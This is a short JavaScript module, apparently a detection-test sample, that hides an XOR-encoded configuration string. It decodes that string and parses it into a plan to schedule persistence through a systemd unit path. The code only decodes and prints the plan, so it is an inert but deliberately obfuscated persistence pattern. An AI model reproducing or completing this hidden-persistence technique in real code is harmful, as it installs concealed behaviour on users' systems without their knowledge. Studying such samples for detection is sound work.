  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_62e145e2 = "[243,206,255,131,240,132,225,145,226,223,189,200,161,205,169,246,133,230,142,235,143,250,150,243,223,173,200,175,198,181,193,164,214,137,237,136,251,152,234,131,243,135,232,154,230,135,227,130,242,134,227,145,172,223,166,213,161,196,169,205,146,246,147,224,131,241,152,232,156,243,129,253,142,250,155,252,153,198,165,202,191,209,165,152,169,213,182,215,186,202,171,194,165,203,148,253,153,164,234,165,225,164,137,204,250,201,136,186,130,179,133,249,138,233,129,228,128,245,153,252,163,211,178,198,174,147,188,217,173,206,225,130,240,159,241,223,187,148,250,149,241,148,185,220,234,217,184,138,178]";
  const Codec_62e145e2 = "decimal_array|rolling_xor|85";

  function load_62e145e2() { return JSON.parse(Material_62e145e2); }
  function decode_62e145e2(v_a19c) { let v_e598 = 133; return v_a19c.map((value) => { const decoded = value ^ v_e598; v_e598 = value; return decoded; }); }
  async function recover_62e145e2() {
    const v_c304 = ["north", "south"].join(":");
    const v_a19c = load_62e145e2(); let v_b27e = [];
    for (const stage of [decode_62e145e2]) v_b27e = stage(v_a19c);
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_62e145e2() { return ({ ...{ value: await recover_62e145e2() } }).value; }
  async function plan_62e145e2() { const inspect = inspect_62e145e2; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_62e145e2;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_62e145e2());
